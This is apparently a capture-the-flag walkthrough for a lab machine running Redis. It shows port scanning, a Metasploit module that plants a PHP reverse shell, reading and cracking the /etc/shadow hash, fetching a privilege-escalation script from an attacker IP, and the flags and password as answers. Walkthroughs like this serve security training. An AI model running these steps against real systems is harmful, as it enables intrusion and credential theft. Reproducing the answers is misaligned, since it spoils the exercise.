# Res

#### Scan the machine, how many ports are open?

```bash
nmap -p- 10.10.242.197
# 80/tcp   open  http
# 6379/tcp open  redis
```

{% hint style="success" %}
`2`
{% endhint %}

#### What's is the database management system installed on the server?

{% hint style="success" %}
`Redis`
{% endhint %}

#### What port is the database management system running on?

{% hint style="success" %}
`6379`
{% endhint %}

#### What's is the version of management system installed on the server?

```bash
nmap -sV -p6379 10.10.242.197
# 6379/tcp open  redis   Redis key-value store 6.0.7
```

{% hint style="success" %}
`6.0.7`
{% endhint %}

#### Compromise the machine and locate user.txt

```
sudo msfdb run
msf > search type:auxiliary redis
msf > use 3
msf > set LocalFile 10.10.242.197
msf > set RHOSTS 10.10.187.15
msf > set LocalFile /home/kali/php-reverse-shell.php
msf > set RemoteFile /var/www/html/shell.php
```

```bash
nc -nvlp 4444
# python -c 'import pty; pty.spawn("/bin/sh")'
# ls /home/
# ls /home/vianka/
# cat /home/vianka/user.txt
```

{% hint style="success" %}
`thm{red1s_rce_w1thout_credent1als}`
{% endhint %}

#### What is the local user account password?

```bash
xxd /etc/shadow | xxd -rp | grep vianka
```

```bash
echo -n '$6$2p.tSTds$qWQfsXwXOAxGJUBuq2RFXqlKiql3jxlwEWZP6CWXm7kIbzR6WzlxHR.UHmi.hc1/TuUOUBo/jWQaQtGSXwvri0' > sha512.hash 
john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt sha512.hash
```

{% hint style="success" %}
`beautiful1`
{% endhint %}

#### Escalate privileges and obtain root.txt

```
wget http://10.17.20.154/suid3num.py -P /tmp/
python /tmp/suid3num.py
xxd /root/root.txt | xxd -rp
```

{% hint style="success" %}
`thm{xxd_pr1v_escalat1on}`
{% endhint %}

#### Reference

{% embed url="https://zhuanlan.zhihu.com/p/280846428" %}
